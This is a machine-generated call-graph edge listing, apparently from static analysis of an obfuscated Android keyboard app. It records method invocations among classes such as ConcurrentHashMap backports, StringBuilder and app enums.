SPECIAL edge: specialinvoke r0.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>($i0, $r1, $r2) in <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.l)> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r2, $i1, $r3, 0, $i0) in <lwk: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
SPECIAL edge: $i3 = specialinvoke r0.<qj: int i(java.lang.Object,int)>($r2, $i2) in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <qj: int i(java.lang.Object,int)>
STATIC edge: $r14 = staticinvoke <lkq: lkl e()>() in <hbw: java.lang.Object a(java.lang.Object)> ==> <lkq: lkl e()>
CLINIT edge: staticinvoke <lkq: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lkq: void <clinit>()>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lsm: int a(lsz)> ==> <lvt: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(16) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
SPECIAL edge: specialinvoke $r0.<lnd: void <init>(java.lang.Object[])>($r1) in <lnd: void <clinit>()> ==> <lnd: void <init>(java.lang.Object[])>
INTERFACE edge: interfaceinvoke $r2.<java.util.List: boolean add(java.lang.Object)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.util.ArrayList: boolean add(java.lang.Object)>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lsp: boolean equals(java.lang.Object)>
CLINIT edge: staticinvoke <lvs: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lvs: void <clinit>()>
STATIC edge: $z2 = staticinvoke <lvm: boolean i(char)>($c1) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <lvm: boolean i(char)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r0) in <hnc: java.lang.String k(java.lang.String,java.lang.String)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r21.<mag: void <init>(java.lang.String,int,int)>("CURATED_IMAGE", 21, 21) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.util.concurrent.b: void <init>(j$.util.concurrent.ConcurrentHashMap)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(8) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
VIRTUAL edge: $l1 = virtualinvoke $r3.<j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>(class "Lj$/util/concurrent/ConcurrentHashMap;", "transferIndex") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("invalid tag type: ") in <lvs: lvs a(java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r7 = staticinvoke <lkx: lkx o(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)>("zh-CN", "com.google.android.inputmethod.pinyin", "zh-TW", "com.google.android.apps.inputmethod.zhuyin", "zh-HK", "com.google.android.apps.inputmethod.cantonese", "ko", "com.google.android.inputmethod.korean") in <hnt: void <clinit>()> ==> <lkx: lkx o(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r0, $i1, $r1, $i0, $i2) in <nvw: void k(java.lang.Object[],java.lang.Object[],int,int,int)> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.b: void <init>(j$.util.concurrent.ConcurrentHashMap)>($r1) in <j$.util.concurrent.e: void <init>(j$.util.concurrent.ConcurrentHashMap)> ==> <j$.util.concurrent.b: void <init>(j$.util.concurrent.ConcurrentHashMap)>
SPECIAL edge: specialinvoke $r4.<java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>("segmentShift", $r2) in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.q: void <init>(j$.util.concurrent.l[],int,int,int)>($r1, $i0, 0, $i1) in <j$.util.concurrent.a: void <init>(j$.util.concurrent.l[],int,int,j$.util.concurrent.ConcurrentHashMap)> ==> <j$.util.concurrent.q: void <init>(j$.util.concurrent.l[],int,int,int)>
SPECIAL edge: specialinvoke $r19.<mag: void <init>(java.lang.String,int,int)>("AVATAR_STICKER_CREATE", 19, 19) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<lts: int b()>() in <lsd: boolean b(lsr)> ==> <lsm: int b()>
SPECIAL edge: specialinvoke $r0.<lwg: void <init>()>() in <lwh: void <clinit>()> ==> <lwg: void <init>()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <ivw: void <init>()> ==> <java.lang.Object: void <init>()>
CLINIT edge: staticinvoke <lkh: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lkh: void <clinit>()>
SPECIAL edge: specialinvoke $r2.<gbk: void <init>(int)>(18) in <ivw: void <clinit>()> ==> <gbk: void <init>(int)>
VIRTUAL edge: $i2 = virtualinvoke $r0.<androidx.lifecycle.ProcessLifecycleOwnerInitializer: int update(android.net.Uri,android.content.ContentValues,java.lang.String,java.lang.String[])>(null, null, "", $r8) in <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)> ==> <androidx.lifecycle.ProcessLifecycleOwnerInitializer: int update(android.net.Uri,android.content.ContentValues,java.lang.String,java.lang.String[])>
INTERFACE edge: $r6 = interfaceinvoke $r3.<java.util.Map: java.lang.Object get(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>
SPECIAL edge: specialinvoke $r7.<java.lang.StringBuilder: void <init>()>() in <nzh: boolean f(ivv)> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: $r3 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r3, 0) in <lvr: void <init>(java.util.List)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
SPECIAL edge: specialinvoke $r8.<lup: void <init>(lwc,java.lang.String)>($r9, $r3) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lup: void <init>(lwc,java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <init>()>() in <com.google.android.apps.inputmethod.latin.LatinApp: void <init>()> ==> <com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <init>()>
SPECIAL edge: specialinvoke $r1.<java.lang.String: void <init>(char[],int,int)>($r3, $i0, $i1) in <nzh: java.lang.String c()> ==> <java.lang.String: void <init>(char[],int,int)>
CLINIT edge: staticinvoke <java.lang.Double: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.Double: void <clinit>()>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: staticinvoke <ojg: void d(java.lang.Object,java.lang.String)>($r1, "destination") in <nvw: void k(java.lang.Object[],java.lang.Object[],int,int,int)> ==> <ojg: void d(java.lang.Object,java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.RuntimeException: void <init>()>() in <java.lang.IndexOutOfBoundsException: void <init>()> ==> <java.lang.RuntimeException: void <init>()>
VIRTUAL edge: $r9 = virtualinvoke r0.<lsn: lwc a()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lsd: lwc a()>
SPECIAL edge: specialinvoke $r1.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <iej: void <clinit>()> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
VIRTUAL edge: $r2 = virtualinvoke r0.<lsc: java.lang.String e()>() in <lsh: lse h(java.util.logging.Level)> ==> <lsc: java.lang.String e()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkx: java.lang.Object get(java.lang.Object)>($r1) in <lkx: boolean containsKey(java.lang.Object)> ==> <lqk: java.lang.Object get(java.lang.Object)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<java.lang.Class: java.lang.reflect.Field[] getDeclaredFields()>() in <j$.sun.misc.b: java.lang.reflect.Field i()> ==> <java.lang.Class: java.lang.reflect.Field[] getDeclaredFields()>
CLINIT edge: staticinvoke <java.lang.Float: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.Float: void <clinit>()>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r4, $i2, $r8, $i3, $i5) in <lvr: void <init>(lvr,lvr)> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
SPECIAL edge: specialinvoke $r29.<mag: void <init>(java.lang.String,int,int)>("TENOR_STATIC_IMAGE", 29, 29) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
CLINIT edge: staticinvoke <lqc: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lqc: void <clinit>()>
VIRTUAL edge: $z0 = virtualinvoke $r3.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l3, $i1, $i2) in <j$.util.concurrent.ConcurrentHashMap: void q(int)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
VIRTUAL edge: $r1 = virtualinvoke $r2.<ivv: ivw b(java.lang.String)>($r0) in <ivw: ivw f(java.lang.String)> ==> <ivv: ivw b(java.lang.String)>
SPECIAL edge: specialinvoke $r3.<java.util.NoSuchElementException: void <init>()>() in <liz: java.lang.Object next()> ==> <java.util.NoSuchElementException: void <init>()>
SPECIAL edge: specialinvoke $r11.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r3.<java.lang.IndexOutOfBoundsException: void <init>()>() in <lsm: java.lang.Object e(int)> ==> <java.lang.IndexOutOfBoundsException: void <init>()>
CLINIT edge: staticinvoke <lsn: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lsn: void <clinit>()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(6) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke $r5.<java.lang.AssertionError: void <init>(java.lang.Object)>("Cannot find field:") in <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)> ==> <java.lang.AssertionError: void <init>(java.lang.Object)>
VIRTUAL edge: $r5 = virtualinvoke $r1.<j$.util.concurrent.q: j$.util.concurrent.l c()>() in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.q: j$.util.concurrent.l c()>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>($c4) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
VIRTUAL edge: $r5 = virtualinvoke $r2.<lts: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <ltr: java.lang.Object d(lsz)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorTrendingMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
CLINIT edge: staticinvoke <hbu: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <hbu: void <clinit>()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r4) in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(8) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(8) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
SPECIAL edge: specialinvoke $r2.<java.util.AbstractMap$SimpleImmutableEntry: void <init>(java.lang.Object,java.lang.Object)>($r1, $r3) in <lvr: java.util.Map$Entry d(java.lang.String,int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: void <init>(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(0) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
STATIC edge: $r3 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(9) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
VIRTUAL edge: $i0 = virtualinvoke $r6.<java.lang.Enum: int ordinal()>() in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <java.lang.Enum: int ordinal()>
INTERFACE edge: $r9 = interfaceinvoke $r7.<java.util.Map$Entry: java.lang.Object getValue()>() in <lvr: void <init>(lvr,lvr)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getValue()>
STATIC edge: staticinvoke <java.util.Collections: void sort(java.util.List)>($r3) in <ivv: ivw a()> ==> <java.util.Collections: void sort(java.util.List)>
CLINIT edge: staticinvoke <j$.util.concurrent.ThreadLocalRandom: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <j$.util.concurrent.ThreadLocalRandom: void <clinit>()>
STATIC edge: staticinvoke <lvm: void h(boolean,java.lang.String)>($z0, "injected class name is empty") in <lsh: lsh j(java.lang.String)> ==> <lvm: void h(boolean,java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.String: boolean equals(java.lang.Object)>($r4) in <ivw: boolean equals(java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r7) in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<liz: java.lang.Object a(int)>($i0) in <liz: java.lang.Object next()> ==> <liw: java.lang.Object a(int)>
SPECIAL edge: $i0 = specialinvoke r0.<ivv: int h()>() in <ivv: ivw a()> ==> <ivv: int h()>
SPECIAL edge: specialinvoke r0.<lsd: void <init>(java.util.logging.Level)>($r2) in <lsf: void <init>(lsh,java.util.logging.Level)> ==> <lsd: void <init>(java.util.logging.Level)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.lang.String: int hashCode()>
SPECIAL edge: specialinvoke r0.<lts: void <init>()>() in <ltr: void <init>()> ==> <lts: void <init>()>
STATIC edge: $r6 = staticinvoke <ivw: ivw f(java.lang.String)>("zz") in <hnt: void <clinit>()> ==> <ivw: ivw f(java.lang.String)>
VIRTUAL edge: $r10 = virtualinvoke $r10.<java.lang.Throwable: java.lang.Throwable getCause()>() in <luk: lum a(java.lang.String[])> ==> <java.lang.Throwable: java.lang.Throwable getCause()>
SPECIAL edge: specialinvoke r0.<lsq: void <init>()>() in <lsp: void <init>(java.lang.String,java.lang.String,int,java.lang.String)> ==> <lsq: void <init>()>
STATIC edge: $r17 = staticinvoke <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>($z0) in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>
VIRTUAL edge: $r17 = virtualinvoke $r15.<java.lang.Class: java.lang.reflect.Constructor getDeclaredConstructor(java.lang.Class[])>($r16) in <lvm: lum j()> ==> <java.lang.Class: java.lang.reflect.Constructor getDeclaredConstructor(java.lang.Class[])>
SPECIAL edge: specialinvoke $r0.<lqk: void <init>()>() in <lqk: void <clinit>()> ==> <lqk: void <init>()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Class: java.lang.reflect.Constructor getDeclaredConstructor(java.lang.Class[])> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke $r0.<java.lang.String: char[] toCharArray()>() in <iwt: char[] s(java.lang.String,char,char,int)> ==> <java.lang.String: char[] toCharArray()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
VIRTUAL edge: $r5 = virtualinvoke r0.<lsn: lsw i(lsq)>($r4) in <lsn: lsw j(java.lang.String,java.lang.String,int,java.lang.String)> ==> <lsn: lsw i(lsq)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lta: boolean equals(java.lang.Object)> ==> <java.lang.Enum: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(3) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c1) in <ivw: boolean F(java.lang.String)> ==> <ivw: boolean u(char)>
VIRTUAL edge: $r1 = virtualinvoke $r1.<java.lang.String: java.lang.String concat(java.lang.String)>($r3) in <hcb: void <init>()> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Boolean: java.lang.Boolean valueOf(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r4) in <lvs: lvs a(java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<java.lang.String: void <init>(char[])>($r1) in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: void <init>(char[])>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: void setLength(int)>(0) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: void setLength(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <ivw: void <init>(ivv,java.lang.String)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r0.<androidx.lifecycle.ProcessLifecycleOwnerInitializer: void <init>()>() in <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)> ==> <androidx.lifecycle.ProcessLifecycleOwnerInitializer: void <init>()>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.String: java.lang.String concat(java.lang.String)>($r2) in <ivv: void f(java.lang.String)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
VIRTUAL edge: $r6 = virtualinvoke r0.<j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>
SPECIAL edge: $i0 = specialinvoke r0.<java.util.AbstractMap: int hashCode()>() in <lvr: int hashCode()> ==> <java.util.AbstractMap: int hashCode()>
SPECIAL edge: specialinvoke $r1.<java.util.concurrent.atomic.AtomicLong: void <init>()>() in <lsu: void <init>()> ==> <java.util.concurrent.atomic.AtomicLong: void <init>()>
INTERFACE edge: interfaceinvoke $r2.<java.util.List: boolean add(java.lang.Object)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.util.ArrayList: boolean add(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r2.<ivv: void e(java.lang.String)>($r4) in <ivw: ivw d(java.util.Locale)> ==> <ivv: void e(java.lang.String)>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r2) in <ivv: void e(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <gcs: void <init>(hbv,lma,int)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke r0.<lsn: void ab(java.lang.String,java.lang.Object[])>($r1, $r4) in <lsn: void F(java.lang.String,java.lang.Object,java.lang.Object)> ==> <lsn: void ab(java.lang.String,java.lang.Object[])>
SPECIAL edge: specialinvoke $r2.<liy: void <init>(ljd)>(r0) in <ljd: java.util.Set entrySet()> ==> <liy: void <init>(ljd)>
SPECIAL edge: specialinvoke $r0.<lkm: void <init>(lkq,int)>($r1, 0) in <lkq: void <clinit>()> ==> <lkm: void <init>(lkq,int)>
VIRTUAL edge: $r4 = virtualinvoke $r5.<java.lang.StringBuilder: java.lang.String toString()>() in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $z0 = virtualinvoke $r5.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lsd: boolean b(lsr)> ==> <java.lang.Enum: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<lqq: void <init>(java.lang.Object,java.lang.Object[],int)>(null, $r1, 0) in <lqq: void <clinit>()> ==> <lqq: void <init>(java.lang.Object,java.lang.Object[],int)>
SPECIAL edge: specialinvoke $r4.<oru: void <init>()>() in <ose: void <clinit>()> ==> <oru: void <init>()>
STATIC edge: $r5 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r5) in <lly: lma g()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $r6 = virtualinvoke $r7.<lsq: java.lang.String b()>() in <lsc: void f(java.lang.String,ltn)> ==> <lso: java.lang.String b()>
SPECIAL edge: $i0 = specialinvoke r0.<qj: int i(java.lang.Object,int)>($r1, $i0) in <qj: int b(java.lang.Object)> ==> <qj: int i(java.lang.Object,int)>
STATIC edge: staticinvoke <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)>
STATIC edge: $r1 = staticinvoke <lkq: lkq h(java.lang.Object[],int)>($r2, $i0) in <lkl: lkq g()> ==> <lkq: lkq h(java.lang.Object[],int)>
SPECIAL edge: specialinvoke $r3.<ltc: void <init>(java.lang.String,int,int)>("LARGE", 2, 50) in <ltc: void <clinit>()> ==> <ltc: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke $r1.<gsv: void <init>()>() in <com.google.android.apps.inputmethod.latin.LatinApp: void <clinit>()> ==> <gsv: void <init>()>
VIRTUAL edge: $r4 = virtualinvoke $r2.<java.lang.Object: java.lang.Class getClass()>() in <lvs: lvs a(java.lang.Object)> ==> <java.lang.Object: java.lang.Class getClass()>
INTERFACE edge: $r5 = interfaceinvoke $r6.<java.util.Map$Entry: java.lang.Object getValue()>() in <hbv: void j()> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getValue()>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(19) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r2 = staticinvoke <lkq: lkq q()>() in <lqs: void <clinit>()> ==> <lkq: lkq q()>
STATIC edge: $z0 = staticinvoke <ojg: boolean f(java.lang.Object,java.lang.Object)>($r1, $r4) in <qj: int i(java.lang.Object,int)> ==> <ojg: boolean f(java.lang.Object,java.lang.Object)>
CLINIT edge: staticinvoke <lwf: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lwf: void <clinit>()>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(12) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
SPECIAL edge: specialinvoke r0.<lje: void a()>() in <lje: java.lang.Object next()> ==> <lje: void a()>
STATIC edge: $z0 = staticinvoke <ivw: boolean z(java.lang.String)>($r2) in <ivv: void e(java.lang.String)> ==> <ivw: boolean z(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<hcb: void <init>()>() in <hcb: void <clinit>()> ==> <hcb: void <init>()>
VIRTUAL edge: $r5 = virtualinvoke $r12.<lts: java.lang.Object d(lsz)>($r13) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lsm: java.lang.Object d(lsz)>
STATIC edge: $r0 = staticinvoke <lkq: lkq h(java.lang.Object[],int)>($r1, $i0) in <lkq: lkq g(java.lang.Object[])> ==> <lkq: lkq h(java.lang.Object[],int)>
SPECIAL edge: specialinvoke $r1.<java.util.ArrayList: void <init>(int)>(3) in <ivv: void <init>()> ==> <java.util.ArrayList: void <init>(int)>
STATIC edge: staticinvoke <iwt: void r(char[],int,int,char,char,int)>($r0, $i0, $i1, 97, 122, $i2) in <iwt: void g(char[],int,int)> ==> <iwt: void r(char[],int,int,char,char,int)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(", parameter ") in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Enum: void <init>(java.lang.String,int)>($r1, $i0) in <mag: void <init>(java.lang.String,int,int)> ==> <java.lang.Enum: void <init>(java.lang.String,int)>
SPECIAL edge: $r7 = specialinvoke $r2.<lvr: java.util.Map$Entry c(int)>($i5) in <lvr: void <init>(lvr,lvr)> ==> <lvr: java.util.Map$Entry c(int)>
SPECIAL edge: specialinvoke $r4.<mag: void <init>(java.lang.String,int,int)>("GIS_GIF_FULL_IMAGE", 4, 4) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lli: void <init>()> ==> <java.lang.Object: void <init>()>
STATIC edge: $r2 = staticinvoke <android.util.Base64: java.lang.String encodeToString(byte[],int)>($r1, 3) in <kes: java.lang.String k(nfe)> ==> <android.util.Base64: java.lang.String encodeToString(byte[],int)>
VIRTUAL edge: virtualinvoke $r30.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r3) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<ljb: void a()>() in <ljb: java.lang.Object getValue()> ==> <ljb: void a()>
STATIC edge: $z0 = staticinvoke <iwt: boolean o(char)>($c0) in <iwt: java.lang.String d(java.lang.String)> ==> <iwt: boolean o(char)>
CLINIT edge: staticinvoke <miv: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <miv: void <clinit>()>
VIRTUAL edge: $z0 = virtualinvoke r0.<nzh: boolean e()>() in <nzh: boolean f(ivv)> ==> <nzh: boolean e()>
